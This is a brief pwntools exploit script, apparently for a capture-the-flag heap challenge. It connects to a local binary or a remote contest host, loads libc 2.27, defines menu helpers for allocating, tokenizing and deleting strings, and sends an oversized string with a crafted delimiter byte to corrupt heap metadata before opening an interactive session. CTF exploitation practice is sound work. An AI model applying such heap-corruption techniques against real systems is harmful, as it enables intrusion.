from pwn import *

if args.LOCAL:
    io=process('./chall_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        """
        gdb.attach(io, cmd)
else: 
    io=remote('mc.ax', 32526)
    #io=remote('0', 1337)
libc=ELF('./libc-2.27.so')
elf=ELF('./chall_patched')

def str_(size, ll):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'size? ', str(size).encode())
    if size:
        sleep(0.1)
        io.send(ll)
    
def tok(idx, delim):
    io.sendlineafter(b'> ', b'2')
    io.sendafter(b'idx? ', str(idx).encode())
    io.sendafter(b'delim? ', delim)
    
def del_(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendafter(b'idx? ', str(idx).encode())
    
def exit_():
    io.sendlineafter(b'> ', b'4')

str_(0x28, b'A'*0x28)
tok(0, b'\x81')
io.interactive()

